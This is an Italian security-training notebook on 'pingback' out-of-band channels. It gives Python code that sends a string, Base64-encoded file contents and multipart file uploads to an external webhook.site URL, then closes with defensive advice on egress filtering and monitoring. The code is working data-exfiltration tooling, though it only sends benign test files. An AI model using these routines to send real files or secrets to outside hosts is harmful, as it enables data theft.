# Pingback Technique & Out-of-Band Data Handling

Questo notebook guida passo dopo passo nella comprensione e nell'implementazione pratica della tecnica di **pingback**, utilizzata in contesti di test di sicurezza per verificare canali di comunicazione in uscita ed esecuzione di codice.

---

## 1. Che cos'è un "Pingback"?

Un **pingback** è una connessione di rete generata dall'interno di un sistema verso un server di raccolta esterno controllato dall'operatore. 

* **Scopo principale:** Verificare che un'azione o un'istruzione iniettata sia stata effettivamente elaborata quando il canale primario non restituisce alcun output visibile (meccanismo *blind* o *out-of-band*).
* **Canali comuni:**
  * **HTTP/HTTPS:** Standard, flessibile per stringhe e file multipart/JSON.
  * **DNS:** Utile per attraversare firewall rigidi quando solo la risoluzione dei nomi è consentita verso l'esterno.
  * **ICMP / TCP Raw:** Alternativa a basso livello quando mancano stack HTTP o tool ad alto livello.

---

## 2. Obiettivi dell'Esercizio

1. **Fase 1 (Test Canale):** Invio di una stringa semplice via POST JSON.
2. **Fase 2 (Dati Codificati):** Invio di file tramite codifica Base64 in URL Query parameters (GET).
3. **Fase 3 (Upload Multipart):** Invio di interi file binari/testuali tramite HTTP POST multipart.
4. **Fase 4 (Difesa):** Analisi dei limiti e contromisure (Egress Filtering, Network Monitoring).

## Setup: Configurazione e Creazione File di Test

Impostiamo l'URL di destinazione (sostituibile con il proprio endpoint univoco) e creiamo i file locali `piccolo.txt` e `prova.txt`.

In [ ]:
import base64
import requests
from pathlib import Path

# Endpoint per la ricezione delle richieste
WEBHOOK = "https://webhook.site/0b358c83-dc54-46f9-b1c2-6d728c852f18"

# Creazione file di prova locali per i test
Path("piccolo.txt").write_text("Contenuto di prova per invio Base64 via GET Query.", encoding="utf-8")
Path("prova.txt").write_text("Contenuto strutturato per invio via POST Multipart Upload.", encoding="utf-8")

print("Setup completato: file 'piccolo.txt' e 'prova.txt' generati.")

--- 
## Fase 1: Invio di una Stringa Semplice (JSON POST)

Questo approccio invia una notifica immediata con un payload leggero in formato JSON. È ideale per il rilevamento iniziale e la verifica dell'uscita di rete.

In [ ]:
def send_string(s: str):
    """Invia una stringa strutturata via JSON POST."""
    payload = {"exfil": s}
    try:
        r = requests.post(WEBHOOK, json=payload, timeout=10)
        print(f"[+] Richiesta inviata. Status code: {r.status_code} ({r.reason})")
        print(f"    Payload: {payload}")
    except requests.exceptions.RequestException as e:
        print(f"[-] Errore di connessione: {e}")

# Esecuzione test
send_string("questa è una stringa di prova dall'esercizio")

--- 
## Fase 2: Invio File via Base64 in Query String (GET)

La codifica Base64 trasforma dati binari o testuali in una sequenza di caratteri ASCII sicuri per il trasporto web (`URL-safe Base64`).

> **Limitazione tecnica:** La maggior parte dei server e reverse proxy (es. Nginx, Apache) impone un limite massimo alla lunghezza dell'URI (solitamente tra 2.048 e 8.192 byte). Questo metodo è adatto esclusivamente a stringhe corte o token.

In [ ]:
def send_file_as_query(path: str):
    """Codifica il contenuto di un file in Base64 URL-safe e lo invia come parametro GET."""
    p = Path(path)
    if not p.exists():
        print(f"[-] File non trovato: {path}")
        return

    b = p.read_bytes()
    b64 = base64.urlsafe_b64encode(b).decode('ascii')

    url = f"{WEBHOOK}?data={b64}"
    try:
        r = requests.get(url, timeout=30)
        print(f"[+] Invio completato. Status code: {r.status_code}")
        print(f"    Lunghezza URL inviata: {len(url)} caratteri")
    except requests.exceptions.RequestException as e:
        print(f"[-] Errore di connessione: {e}")

# Esecuzione test
send_file_as_query("./piccolo.txt")

--- 
## Fase 3: Upload File tramite Multipart Form Data (POST)

Per trasferire file strutturati, binari o di dimensioni consistenti, la codifica multipart `multipart/form-data` tramite metodo POST rappresenta lo standard più robusto.

In [ ]:
def upload_file(path: str):
    """Invia un file intero come form-data multipart."""
    p = Path(path)
    if not p.exists():
        print(f"[-] File non trovato: {path}")
        return
        
    try:
        with p.open("rb") as f:
            files = {"file": (p.name, f)}
            r = requests.post(WEBHOOK, files=files, timeout=30)
            
        print(f"[+] File caricato. Status code: {r.status_code}")
        if r.status_code == 200:
            print("    Verifica riuscita: controlla l'endpoint webhook per ispezionare il payload.")
    except requests.exceptions.RequestException as e:
        print(f"[-] Errore di connessione: {e}")

# Esecuzione test
upload_file("./prova.txt")

--- 
## 3. Riepilogo Comparativo delle Tecniche

| Metodo | Canale / Metodo | Capacità Dati | Vantaggi | Limitazioni Principali |
| :--- | :--- | :--- | :--- | :--- |
| **JSON String** | `HTTP POST` | Piccola / Media | Immediato da analizzare, compatto | Richiede supporto JSON lato client/server |
| **Base64 Query** | `HTTP GET` | Molto ridotta | Nessun body necessario | Limiti rigidi di lunghezza URL (`414 URI Too Long`) |
| **Multipart Form** | `HTTP POST` | Ampia | Gestisce file binari nativamente | Più rumoroso e visibile nei log di rete |

---

## 4. Analisi Difensiva e Contromisure

Per prevenire o rilevare canali di pingback non autorizzati in ambienti di produzione:

1. **Egress Filtering (Filtraggio in Uscita):** 
   * Bloccare tutte le connessioni in uscita di default (*default-deny*).
   * Consentire solo traffico verso domini o IP esplicitamente inseriti in allowlist tramite proxy aziendale.
2. **Network Monitoring & IDS/IPS:**
   * Monitorare flussi di traffico anomali verso indirizzi IP non censiti o servizi di webhook pubblici.
   * Analisi di query DNS ad alta entropia o volume (rilevamento DNS tunneling).
3. **Application Sandboxing & Least Privilege:**
   * Isolare i processi applicativi per impedire l'apertura di socket arbitrari verso l'esterno.
   * Disabilitare o rimuovere strumenti di trasferimento rete (`curl`, `wget`, `nc`) dagli ambienti di produzione containerizzati.